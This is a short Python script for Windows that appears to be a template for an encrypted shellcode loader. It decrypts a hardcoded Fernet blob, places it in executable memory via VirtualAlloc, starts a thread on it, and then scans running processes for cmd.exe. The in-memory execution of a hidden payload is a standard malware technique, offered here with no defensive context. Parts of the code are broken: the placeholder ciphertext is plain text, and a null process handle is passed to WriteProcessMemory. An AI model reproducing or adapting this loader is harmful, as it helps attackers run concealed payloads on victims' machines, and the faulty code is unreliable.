
from cryptography.fernet import Fernet
import ctypes
from ctypes import *

key = b'Dp3fafvz-bfrS4v1kc7APsNlHMI14q_v8UVtZ6XIWko='
cipher = Fernet(key)

encrypted_data = b'this is a test'

# Decrypt the content
decrypted_data = cipher.decrypt(encrypted_data)

# Allocate memory for the decrypted content
size = len(decrypted_data)
addr = windll.kernel32.VirtualAlloc(None, size, 0x1000 | 0x2000 | 0x40, 0x40)
ctypes.windll.kernel32.WriteProcessMemory(None, addr, decrypted_data, size, None)

# Create a new thread to execute the decrypted software in memory
thread_id = ctypes.c_ulong(0)
ctypes.windll.kernel32.CreateThread(None, 0, addr, None, 0, ctypes.byref(thread_id))

# Get the ID of the current process
current_process_id = ctypes.windll.kernel32.GetCurrentProcessId()

# Enumerate all processes on the system and check for the new process
process_ids = (c_ulong * 1024)()
bytes_returned = c_ulong()
ctypes.windll.psapi.EnumProcesses(byref(process_ids), sizeof(process_ids), byref(bytes_returned))

num_processes = bytes_returned.value // sizeof(c_ulong)
for i in range(num_processes):
    pid = process_ids[i]
    if pid != 0:
        hProcess = ctypes.windll.kernel32.OpenProcess(0x0400 | 0x0010, False, pid)
        if hProcess:
            process_image_name = (c_char * 1024)()
            ctypes.windll.psapi.GetProcessImageFileNameA(hProcess, process_image_name, sizeof(process_image_name))
            process_name = process_image_name.value.split(b"\\")[-1]
            if process_name == b"cmd.exe":
                print("New process created with PID:", pid)